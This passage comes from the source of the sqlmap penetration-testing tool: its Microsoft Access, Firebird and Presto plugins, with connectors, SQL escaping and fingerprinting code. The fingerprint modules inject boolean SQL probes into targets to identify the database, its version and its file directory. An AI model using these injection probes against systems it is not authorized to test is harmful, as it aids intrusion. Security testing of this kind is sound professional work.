Microsoft Access it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchDb(self):\n        warnMsg = \"on Microsoft Access it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Microsoft Access it is not possible to search tables\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Microsoft Access it is not possible to search columns\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Microsoft Access search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/access/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import pyodbc\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.core.settings import IS_WIN\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/mkleehammer/pyodbc\n    User guide: https://github.com/mkleehammer/pyodbc/wiki\n    Debian package: python-pyodbc\n    License: MIT\n    \"\"\"\n\n    def connect(self):\n        if not IS_WIN:\n            errMsg = \"currently, direct connection to Microsoft Access database(s) \"\n            errMsg += \"is restricted to Windows platforms\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n        self.initConnection()\n        self.checkFileDb()\n\n        try:\n            self.connector = pyodbc.connect('Driver={Microsoft Access Driver (*.mdb)};Dbq=%s;Uid=Admin;Pwd=;' % self.db)\n        except (pyodbc.Error, pyodbc.OperationalError) as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except pyodbc.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except (pyodbc.OperationalError, pyodbc.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except pyodbc.Error as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/access/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)&CHR(98)&CHR(99)&CHR(100)&CHR(101)&CHR(102)&CHR(103)&CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"&\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/access/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import getCurrentThreadData\nfrom lib.core.common import randomStr\nfrom lib.core.common import wasLastResponseDBMSError\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import ACCESS_ALIASES\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ACCESS)\n\n    def _sandBoxCheck(self):\n        # Reference: http://milw0rm.com/papers/198\n        retVal = None\n        table = None\n\n        if Backend.isVersionWithin((\"97\", \"2000\")):\n            table = \"MSysAccessObjects\"\n        elif Backend.isVersionWithin((\"2002-2003\", \"2007\")):\n            table = \"MSysAccessStorage\"\n\n        if table is not None:\n            result = inject.checkBooleanExpression(\"EXISTS(SELECT CURDIR() FROM %s)\" % table)\n            retVal = \"not sandboxed\" if result else \"sandboxed\"\n\n        return retVal\n\n    def _sysTablesCheck(self):\n        infoMsg = \"executing system table(s) existence fingerprint\"\n        logger.info(infoMsg)\n\n        # Microsoft Access table reference updated on 01/2010\n        sysTables = {\n            \"97\": (\"MSysModules2\", \"MSysAccessObjects\"),\n            \"2000\": (\"!MSysModules2\", \"MSysAccessObjects\"),\n            \"2002-2003\": (\"MSysAccessStorage\", \"!MSysNavPaneObjectIDs\"),\n            \"2007\": (\"MSysAccessStorage\", \"MSysNavPaneObjectIDs\"),\n        }\n\n        # MSysAccessXML is not a reliable system table because it doesn't always exist\n        # (\"Access through Access\", p6, should be \"normally doesn't exist\" instead of \"is normally empty\")\n\n        for version, tables in sysTables.items():\n            exist = True\n\n            for table in tables:\n                negate = False\n\n                if table[0] == '!':\n                    negate = True\n                    table = table[1:]\n\n                result = inject.checkBooleanExpression(\"EXISTS(SELECT * FROM %s WHERE [RANDNUM]=[RANDNUM])\" % table)\n                if result is None:\n                    result = False\n\n                if negate:\n                    result = not result\n\n                exist &= result\n\n                if not exist:\n                    break\n\n            if exist:\n                return version\n\n        return None\n\n    def _getDatabaseDir(self):\n        retVal = None\n\n        infoMsg = \"searching for database directory\"\n        logger.info(infoMsg)\n\n        randStr = randomStr()\n        inject.checkBooleanExpression(\"EXISTS(SELECT * FROM %s.%s WHERE [RANDNUM]=[RANDNUM])\" % (randStr, randStr))\n\n        if wasLastResponseDBMSError():\n            threadData = getCurrentThreadData()\n            match = re.search(r\"Could not find file\\s+'([^']+?)'\", threadData.lastErrorPage[1])\n\n            if match:\n                retVal = match.group(1).rstrip(\"%s.mdb\" % randStr)\n\n                if retVal.endswith('\\\\'):\n                    retVal = retVal[:-1]\n\n        return retVal\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.ACCESS\n            return value\n\n        actVer = Format.getDbms() + \" (%s)\" % (self._sandBoxCheck())\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                if re.search(r\"-log$\", kb.data.banner or \"\"):\n                    banVer += \", logging enabled\"\n\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        value += \"\\ndatabase directory: '%s'\" % self._getDatabaseDir()\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(ACCESS_ALIASES):\n            setDbms(DBMS.ACCESS)\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.ACCESS\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"VAL(CVAR(1))=1\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.ACCESS\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.ACCESS\n                logger.warning(warnMsg)\n                return False\n\n            setDbms(DBMS.ACCESS)\n\n            if not conf.extensiveFp:\n                return True\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.ACCESS\n            logger.info(infoMsg)\n\n            version = self._sysTablesCheck()\n\n            if version is not None:\n                Backend.setVersion(version)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.ACCESS\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = (\"%s%s\" % (DBMS.ACCESS, METADB_SUFFIX)).replace(' ', '_')\n", "plugins/dbms/access/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Microsoft Access it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Microsoft Access it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Microsoft Access it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Microsoft Access it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/access/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Microsoft Access it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Microsoft Access it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/access/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import ACCESS_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.access.enumeration import Enumeration\nfrom plugins.dbms.access.filesystem import Filesystem\nfrom plugins.dbms.access.fingerprint import Fingerprint\nfrom plugins.dbms.access.syntax import Syntax\nfrom plugins.dbms.access.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass AccessMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Microsoft Access methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = ACCESS_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.ACCESS] = Syntax.escape\n", "plugins/dbms/firebird/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getDbs(self):\n        warnMsg = \"on Firebird it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Firebird it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def searchDb(self):\n        warnMsg = \"on Firebird it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getHostname(self):\n        warnMsg = \"on Firebird it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Firebird it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/firebird/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import kinterbasdb\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.settings import UNICODE_ENCODING\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://kinterbasdb.sourceforge.net/\n    User guide: http://kinterbasdb.sourceforge.net/dist_docs/usage.html\n    Debian package: python-kinterbasdb\n    License: BSD\n    \"\"\"\n\n    # sample usage:\n    # ./sqlmap.py -d \"firebird://sysdba:testpass@/opt/firebird/testdb.fdb\"\n    # ./sqlmap.py -d \"firebird://sysdba:testpass@127.0.0.1:3050//opt/firebird/testdb.fdb\"\n    def connect(self):\n        self.initConnection()\n\n        if not self.hostname:\n            self.checkFileDb()\n\n        try:\n            # Reference: http://www.daniweb.com/forums/thread248499.html\n            self.connector = kinterbasdb.connect(host=self.hostname.encode(UNICODE_ENCODING), database=self.db.encode(UNICODE_ENCODING), user=self.user.encode(UNICODE_ENCODING), password=self.password.encode(UNICODE_ENCODING), charset=\"UTF8\")\n        except kinterbasdb.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except kinterbasdb.OperationalError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except kinterbasdb.OperationalError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except kinterbasdb.Error as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/firebird/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import isDBMSVersionAtLeast\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Backend.setVersion('2.0')\n        ['2.0']\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        >>> Backend.setVersion('2.1')\n        ['2.1']\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT ASCII_CHAR(97)||ASCII_CHAR(98)||ASCII_CHAR(99)||ASCII_CHAR(100)||ASCII_CHAR(101)||ASCII_CHAR(102)||ASCII_CHAR(103)||ASCII_CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"ASCII_CHAR(%d)\" % _ for _ in getOrds(value))\n\n        retVal = expression\n\n        if isDBMSVersionAtLeast(\"2.1\"):\n            retVal = Syntax._escape(expression, quote, escaper)\n\n        return retVal\n", "plugins/dbms/firebird/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import randomRange\nfrom lib.core.common import randomStr\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import FIREBIRD_ALIASES\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.FIREBIRD)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n        actVer = Format.getDbms()\n\n        if not conf.extensiveFp:\n            value += actVer\n            return value\n\n        actVer = Format.getDbms() + \" (%s)\" % (self._dialectCheck())\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                if re.search(r\"-log$\", kb.data.banner or \"\"):\n                    banVer += \", logging enabled\"\n\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def _sysTablesCheck(self):\n        retVal = None\n        table = (\n            (\"1.0\", (\"EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)\",)),\n            (\"1.5\", (\"NULLIF(%d,%d) IS NULL\", \"EXISTS(SELECT CURRENT_TRANSACTION FROM RDB$DATABASE)\")),\n            (\"2.0\", (\"EXISTS(SELECT CURRENT_TIME(0) FROM RDB$DATABASE)\", \"BIT_LENGTH(%d)>0\", \"CHAR_LENGTH(%d)>0\")),\n            (\"2.1\", (\"BIN_XOR(%d,%d)=0\", \"PI()>0.%d\", \"RAND()<1.%d\", \"FLOOR(1.%d)>=0\")),\n            (\"2.5\", (\"'%s' SIMILAR TO '%s'\",)),  # Reference: https://firebirdsql.org/refdocs/langrefupd25-similar-to.html\n            (\"3.0\", (\"FALSE IS FALSE\",)),  # https://www.firebirdsql.org/file/community/conference-2014/pdf/02_fb.2014.whatsnew.30.en.pdf\n        )\n\n        for i in xrange(len(table)):\n            version, checks = table[i]\n            failed = False\n            check = checks[randomRange(0, len(checks) - 1)].replace(\"%d\", getUnicode(randomRange(1, 100))).replace(\"%s\", getUnicode(randomStr()))\n            result = inject.checkBooleanExpression(check)\n\n            if result:\n                retVal = version\n            else:\n                failed = True\n                break\n\n            if failed:\n                break\n\n        return retVal\n\n    def _dialectCheck(self):\n        retVal = None\n\n        if Backend.getIdentifiedDbms():\n            result = inject.checkBooleanExpression(\"EXISTS(SELECT CURRENT_DATE FROM RDB$DATABASE)\")\n            retVal = \"dialect 3\" if result else \"dialect 1\"\n\n        return retVal\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(FIREBIRD_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.FIREBIRD, Backend.getVersion()))\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.FIREBIRD\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"(SELECT COUNT(*) FROM RDB$DATABASE WHERE [RANDNUM]=[RANDNUM])>0\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.FIREBIRD\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"EXISTS(SELECT CURRENT_USER FROM RDB$DATABASE)\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.FIREBIRD\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.FIREBIRD)\n\n            infoMsg = \"actively fingerprinting %s\" % DBMS.FIREBIRD\n            logger.info(infoMsg)\n\n            version = self._sysTablesCheck()\n\n            if version is not None:\n                Backend.setVersion(version)\n                setDbms(\"%s %s\" % (DBMS.FIREBIRD, version))\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.FIREBIRD\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = \"%s%s\" % (DBMS.FIREBIRD, METADB_SUFFIX)\n\n        if conf.tbl:\n            conf.tbl = conf.tbl.upper()\n", "plugins/dbms/firebird/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Firebird it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Firebird it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Firebird it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Firebird it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/firebird/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Firebird it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Firebird it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/firebird/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import FIREBIRD_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.firebird.enumeration import Enumeration\nfrom plugins.dbms.firebird.filesystem import Filesystem\nfrom plugins.dbms.firebird.fingerprint import Fingerprint\nfrom plugins.dbms.firebird.syntax import Syntax\nfrom plugins.dbms.firebird.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass FirebirdMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Firebird methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = FIREBIRD_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.FIREBIRD] = Syntax.escape\n", "plugins/dbms/presto/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Presto it is not possible to get the banner\"\n        logger.warning(warnMsg)\n\n        return None\n\n    def getCurrentDb(self):\n        warnMsg = \"on Presto it is not possible to get name of the current database (schema)\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on Presto it is not possible to test if current user is DBA\"\n        logger.warning(warnMsg)\n\n    def getUsers(self):\n        warnMsg = \"on Presto it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on Presto it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Presto it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Presto it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on Presto it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Presto it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/presto/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import prestodb\nexcept:\n    pass\n\nimport logging\nimport struct\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/prestodb/presto-python-client\n    User guide: https://github.com/prestodb/presto-python-client/blob/master/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    PyPI package: presto-python-client\n    License: Apache License 2.0\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = prestodb.dbapi.connect(host=self.hostname, user=self.user, catalog=self.db, port=self.port, request_timeout=conf.timeout)\n        except (prestodb.exceptions.OperationalError, prestodb.exceptions.InternalError, prestodb.exceptions.ProgrammingError, struct.error) as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except prestodb.exceptions.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except (prestodb.exceptions.OperationalError, prestodb.exceptions.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except prestodb.exceptions.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "plugins/dbms/presto/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/presto/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import PRESTO_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.PRESTO)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.PRESTO\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += 